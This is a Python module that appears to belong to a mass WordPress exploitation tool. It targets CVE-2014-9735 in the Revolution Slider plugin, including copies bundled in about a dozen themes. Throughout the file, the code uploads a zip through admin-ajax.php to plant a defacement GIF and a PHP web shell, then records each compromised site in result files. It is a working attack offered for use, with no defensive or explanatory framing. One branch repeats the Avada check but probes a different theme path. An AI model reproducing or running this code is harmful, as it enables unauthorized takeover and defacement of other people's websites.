# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    try:
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        Exploit = 'http://' + site + '/wp-admin/admin-ajax.php'
        data = {'action': "revslider_ajax_action", 'client_action': "update_plugin"}
        FileShell = {'update_file': open('files/rock.zip', 'rb')}
        CheckRevslider = requests.get('http://' + site, timeout=10, headers=Headers)
        if '/wp-content/plugins/revslider/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev = requests.get('http://' + site +
                                    '/wp-content/plugins/revslider/temp/update_extract/pwn.gif',
                                    timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/plugins/revslider/temp/update_extract/neko.php',
                                          timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/plugins/revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/Avada/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev1 = requests.get('http://' + site +
                                     '/wp-content/themes/Avada/framework/plugins/'
                                     'revslider/temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev1.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/Avada/framework/plugins/'
                                          'revslider/temp/update_extract/neko.php',
                                          timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/Avada/framework/plugins/'
                                   'revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/Avada/framework/plugins/'
                               'revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/striking_r/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev2 = requests.get('http://' + site +
                                     '/wp-content/themes/striking_r/framework/plugins/'
                                     'revslider/temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev2.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/striking_r/framework/plugins/'
                                          'revslider/temp/update_extract/neko.php',
                                          timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/striking_r/framework/plugins/'
                                   'revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/striking_r/framework/'
                               'plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/IncredibleWP/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev3 = requests.get('http://' + site +
                                     '/wp-content/themes/IncredibleWP/framework/'
                                     'plugins/revslider/temp/update_extract/pwn.gif',
                                     timeout=5, headers=Headers)
            if 'GIF89a' in str(CheckRev3.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/IncredibleWP/framework'
                                          '/plugins/revslider/temp/update_extract/neko.php',
                                          timeout=5, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/IncredibleWP/'
                                   'framework/plugins/revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/IncredibleWP/'
                               'framework/plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/ultimatum/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev4 = requests.get('http://' + site +
                                     '/wp-content/themes/ultimatum/wonderfoundry/'
                                     'addons/plugins/revslider/temp/update_extract/pwn.gif',
                                     timeout=5, headers=Headers)
            if 'GIF89a' in str(CheckRev4.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/ultimatum/wonderfoundry/'
                                          'addons/plugins/revslider/temp/update_extract/neko.php',
                                          timeout=5, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/ultimatum/wonderfoundry/'
                                   'addons/plugins/revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/'
                               'revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/medicate/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev5 = requests.get('http://' + site +
                                     '/wp-content/themes/medicate/script/'
                                     'revslider/temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev5.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/medicate/script/revslider/'
                                          'temp/update_extract/neko.php', timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/medicate/script/'
                                   'revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/medicate/script/revslider/'
                               'temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/centum/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev6 = requests.get('http://' + site +
                                     '/wp-content/themes/centum/revslider/'
                                     'temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev6.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/centum/revslider/'
                                          'temp/update_extract/neko.php', timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/centum/revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/centum/revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/beach_apollo/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev7 = requests.get('http://' + site +
                                     '/wp-content/themes/beach_apollo/advance/plugins/'
                                     'revslider/temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev7.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/beach_apollo/advance/plugins/'
                                          'revslider/temp/update_extract/neko.php', timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/beach_apollo/advance/plugins/'
                                   'revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/beach_apollo/advance/plugins/'
                               'revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/cuckootap/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev8 = requests.get('http://' + site +
                                     '/wp-content/themes/cuckootap/framework/plugins/'
                                     'revslider/temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev8.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/cuckootap/framework/plugins/'
                                          'revslider/temp/update_extract/neko.php', timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/cuckootap/framework/plugins/revslider/'
                                   'temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/cuckootap/framework/plugins/'
                               'revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/pindol/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev9 = requests.get('http://' + site +
                                     '/wp-content/themes/pindol/revslider/'
                                     'temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev9.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/pindol/revslider/'
                                          'temp/update_extract/neko.php', timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/pindol/revslider/temp/update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/pindol/revslider/temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/designplus/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev10 = requests.get('http://' + site +
                                      '/wp-content/themes/designplus/framework/plugins'
                                      '/revslider/temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev10.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/designplus/framework/plugins/'
                                          'revslider/temp/update_extract/neko.php', timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/'
                                   'update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/designplus/framework/plugins/revslider/'
                               'temp/update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/rarebird/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev11 = requests.get('http://' + site +
                                      '/wp-content/themes/rarebird/framework/plugins/revslider/'
                                      'temp/update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev11.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/rarebird/framework/plugins/revslider/temp'
                                          '/update_extract/neko.php', timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                                   'update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                               'update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        elif '/wp-content/themes/Avada/' in str(CheckRevslider.content):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
            CheckRev12 = requests.get('http://' + site +
                                      '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                      'update_extract/pwn.gif', timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckRev12.content):
                ShellCheck = requests.get('http://' + site +
                                          '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                          'update_extract/neko.php', timeout=10, headers=Headers)
                if 'neko!!' in str(ShellCheck.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                   'update_extract/neko.php' + '\n')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(
                        site + '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                               'update_extract/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2014-9735', 'Revslider Upload Shell', 'Wordpress')
